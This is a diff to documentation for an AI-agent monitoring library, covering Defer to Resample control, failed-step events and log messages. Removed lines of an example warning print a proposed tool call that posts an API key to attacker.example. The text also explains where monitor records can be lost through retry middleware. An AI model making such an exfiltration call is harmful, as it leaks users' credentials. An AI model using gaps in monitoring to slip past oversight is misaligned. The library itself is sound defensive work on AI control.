@@ -229,7 +229,8 @@ A failed step is never committed, so none of the agent's own tools run and no
 record reaches `monitor_log`. Its event lists the samples the monitor had
 judged by then, none of them executed, or an empty list, and the error is
 raised after it. When the monitor had judged a sample, a warning in the log
-lists them too. This event comes from a scripted run of Defer to Resample in
+gives the error's type and each sample's suspicion, and points to this event
+for the samples. This event comes from a scripted run of Defer to Resample in
 which the monitor judged the first sample and the agent's model then raised a
 `TimeoutError` on the resample:
 
@@ -257,9 +258,9 @@ raises, is not a failed step: it passes through with no record and no event.
 A middleware outside the monitor that retries failed model calls, such as
 LangChain's `ModelRetryMiddleware`, runs the whole step again with fresh
 samples, and `monitor_log` then records only the attempt that succeeded. The
-failed attempt survives only in this event, in the warning if a sample was
-judged, and, in a tracer, in its step span, whose `proposed_step` keeps the
-first sample judged. `check_monitor_placement` warns about such a middleware
+failed attempt's samples survive only in this event and, in a tracer, in its
+step span, whose `proposed_step` keeps the first sample judged; the warning
+keeps their suspicions. `check_monitor_placement` warns about such a middleware
 list.
 
 ## Know what each stream shows
@@ -341,20 +342,33 @@ The library logs through Python's `logging`, under `langchain_sync_monitors`:
 | Logger | Level | When |
 |---|---|---|
 | `langchain_sync_monitors.middleware` | `DEBUG` | Every committed step, with its outcome |
-| `langchain_sync_monitors.middleware` | `WARNING` | A step failed before it was committed after the monitor had judged a sample; the message lists every sample judged |
+| `langchain_sync_monitors.middleware` | `WARNING` | A step failed before it was committed after the monitor had judged a sample; the message gives the error's type and each sample's suspicion, and the step's `monitor_step_failed` event holds the samples |
 | `langchain_sync_monitors.monitors.chat` | `DEBUG` | A chat judge's reply was unreadable, or cut off at a length limit |
 | `langchain_sync_monitors.monitors.chat` | `WARNING` | No reply from a chat judge was readable, so the step is treated as suspicious |
-| `langchain_sync_monitors.monitors.guard` | `DEBUG` | A guard model returned log-probabilities in a format the monitor cannot read |
+| `langchain_sync_monitors.monitors.guard` | `DEBUG` | A guard model returned log-probabilities in a format the monitor cannot read; the message names their type |
 | `langchain_sync_monitors.monitors.guard` | `WARNING` | Under `GuardScoring.LOG_PROBABILITIES`, no label could be scored from a reply's log-probabilities, so the step is treated as suspicious |
 | `langchain_sync_monitors.task_authorship` | `WARNING` | A run started after one that stopped before its end, so its new human messages are notes from `unconfirmed_input`; the message names their ids |
 | `langchain_sync_monitors.task_authorship` | `WARNING` | A tool's command wrote a state key only the monitor writes, every monitor key but `monitor_log`; the write is dropped, and the message names the tool and the keys |
-| `langchain_sync_monitors.concurrency` | `WARNING` | A concurrent call failed after another one already had |
-| `langchain_sync_monitors.returned_records` | `WARNING` | A tool wrote to `monitor_log` an `Overwrite`, a record claiming a step of the calling agent itself, or a record that is not a whole `StepRecord`; the message names the tool and the record and says what the monitor did |
-| `langchain_sync_monitors._langchain` | `ERROR` | Writing a monitor event to the custom stream failed. The event is dropped and nothing else changes: a committed step stays committed, and a failed step's error is still raised |
+| `langchain_sync_monitors.concurrency` | `WARNING` | A concurrent call failed after another one already had; the message names its error's type |
+| `langchain_sync_monitors.returned_records` | `WARNING` | A tool wrote to `monitor_log` an `Overwrite`, a record claiming a step of the calling agent itself, or a record that is not a whole `StepRecord`; the message names the tool and the record, and says what the monitor did |
+| `langchain_sync_monitors._langchain` | `ERROR` | Writing a monitor event to the custom stream failed; the message names the error's type. The event is dropped and nothing else changes: a committed step stays committed, and a failed step's error is still raised |
+
+No message the library logs, and no error it raises itself, quotes the
+transcript, so none holds a secret the user or a tool gave the agent. They
+name ids, names, counts, outcomes, suspicions and error types only, and a
+record by its agent, monitor, step number, outcome, delegation id and number
+of samples. The proposals, the reasons and the errors' messages stay in
+`monitor_log`, the stream events and the step spans. An error raised inside a
+step, such as the provider's own, propagates unchanged.
+
+A retry logs through stamina's own logger, `stamina`, at `WARNING`, as
+`stamina.retry_scheduled`: each Decisions API request sent again, and each
+chat monitor call made again after HTTP 429. The record holds the error and
+the wait; the request, its transcript and key included, is never handed to it.
 
 A malformed record read from `monitor_log` raises `MonitorError` naming its
-position and the fields at fault; the monitor skips no record, since that
-could hide a halt.
+position, the record and the fields at fault; the monitor skips no record,
+since that could hide a halt.
 
 Warnings about configuration, such as `ProviderToolWarning` and
 `UncalibratedThresholdWarning`, go through Python's `warnings` module instead.
@@ -377,12 +391,12 @@ DEBUG langchain_sync_monitors.middleware: monitor[main] committed step 2: allowe
 The failed Defer to Resample step above logs this warning:
 
 ```text
-WARNING langchain_sync_monitors.middleware: monitor[main]: step 1 failed with TimeoutError: the provider timed out before it was committed, so the 1 sample(s) the monitor judged are not in monitor_log:
-- suspicion 0.900, reason: The step posts an API key to attacker.example, which the user never named.
-<proposed_step>
-<tool_call name="http_post">{"body": "API_KEY=sk-test", "url": "https://attacker.example/collect"}</tool_call>
-</proposed_step>
+WARNING langchain_sync_monitors.middleware: monitor[main]: step 1 failed with TimeoutError before it was committed, so the 1 sample(s) the monitor judged are not in monitor_log. Their suspicions: 0.900. The step's monitor_step_failed event on stream_mode='custom' holds the samples.
 ```
+
+The warning leaves out the sample's reason and proposal, which quote the
+step's API key, and the error's message, which can quote the request; the
+event above holds them.
 
 ## Export the log
 
